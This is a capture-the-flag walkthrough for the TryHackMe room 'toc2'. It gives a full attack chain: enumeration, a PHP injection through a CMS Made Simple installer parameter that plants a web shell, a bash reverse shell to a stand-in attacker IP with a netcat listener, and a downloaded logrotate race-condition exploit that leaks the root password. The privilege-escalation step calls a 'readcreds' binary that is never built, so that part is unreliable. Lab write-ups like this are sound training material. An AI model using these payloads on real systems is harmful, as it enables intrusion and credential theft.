# [toc2](https://tryhackme.com/room/toc2)

## It's a setup... Can you get the flags in time?

# Exploit the Machine

### Find and retrieve the user.txt flag

1. Start by performing a service version scan on the target machine to identify open ports and running services:

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Enumerate directories and files on the web server using gobuster:

**Results:**

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -t 50
```

```
/robots.txt           (Status: 200) [Size: 174]
/server-status        (Status: 403) [Size: 278]
```

3. Visit `/robots.txt` which reveals a link to `http://<TARGET_IP>/cmsms/`.

4. Navigate to `http://<TARGET_IP>/cmsms/cmsms-2.1.6-install.php` which shows an unfinished CMS Made Simple installation page. This is our entry point for exploitation.

5. Intercept the installation request on step 4 using Burp Suite. Configure the database parameters with credentials found earlier:
   - Database Name: `cmsmsdb` (from `http://<TARGET_IP>/robots.txt`)
   - User name: `cmsmsuser` (from `http://<TARGET_IP>/`)
   - Password: `devpass` (from `http://<TARGET_IP>/`)
   - Modify the `default_timezone` parameter to inject PHP code: `junk';echo%20system($_GET['cmd']);$junk='junk`

This [injection payload](https://www.exploit-db.com/exploits/44192) will write a web shell into the `config.php` file, allowing remote command execution via the `cmd` GET parameter.

<img width="1400" height="863" alt="SCREEN01" src="https://github.com/user-attachments/assets/c9a69da3-9316-4485-9462-bb73ba1ee21f" />

6. Prepare a reverse shell payload. URL encode the following bash command using [CyberChef](https://gchq.github.io/CyberChef/) with "Encode All Characters" option:

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

7. Set up a netcat listener on your attack machine to catch the reverse shell:

```bash
nc -lvnp 4444
```

8. Trigger the reverse shell by visiting the URL with our encoded payload: `http://<TARGET_IP>/cmsms/config.php?cmd=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F%3CATTACKER%5FIP%3E%2F4444%200%3E%261%27`.

You should receive a shell as the `www-data` user.

9. Read the user flag located in Frank's home directory:

```bash
cat /home/frank/user.txt
```

<img width="638" height="409" alt="SCREEN02" src="https://github.com/user-attachments/assets/1dd498a4-76d6-4920-b26c-2239c670d0af" />

---

### Escalate your privileges and acquire root.txt

_https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c_

1. SSH into the machine as Frank using the discovered credentials:

```bash
ssh frank@<TARGET_IP>
# Password: password (from /home/frank/new_machine.txt)
```

2. Download the exploit code to the target:

```bash
wget https://raw.githubusercontent.com/sroettger/35c3ctf_chals/refs/heads/master/logrotate/exploit/rename.c
```

3. Compile the exploit and prepare the attack:

```bash
gcc rename.c -o rename
touch pwd

```

The exploit leverages a race condition where logrotate runs as root and can be tricked into creating a symlink to sensitive files.

4. Execute the exploit to create a symlink race condition:

```bash
./rename pwd root_password_backup
```

Then, open a **second terminal** with another `frank` SSH session. In this new session, repeatedly trigger logrotate by monitoring and forcing log rotation. Run this command multiple times:

```bash
./readcreds root_password_backup
```

Keep running until the race condition succeeds and you retrieve the root credentials.

<img width="676" height="270" alt="SCREEN03" src="https://github.com/user-attachments/assets/3f2713c1-39bc-47f3-8683-1193e23317f9" />

**Credentials Found:** `root:aloevera`

5. Switch to the root user and retrieve the final flag:

```bash
su root
# Password: aloevera
cat /root/root.txt
```

<img width="528" height="115" alt="SCREEN04" src="https://github.com/user-attachments/assets/36eb360b-10ee-4dfe-8173-1897482955d1" />
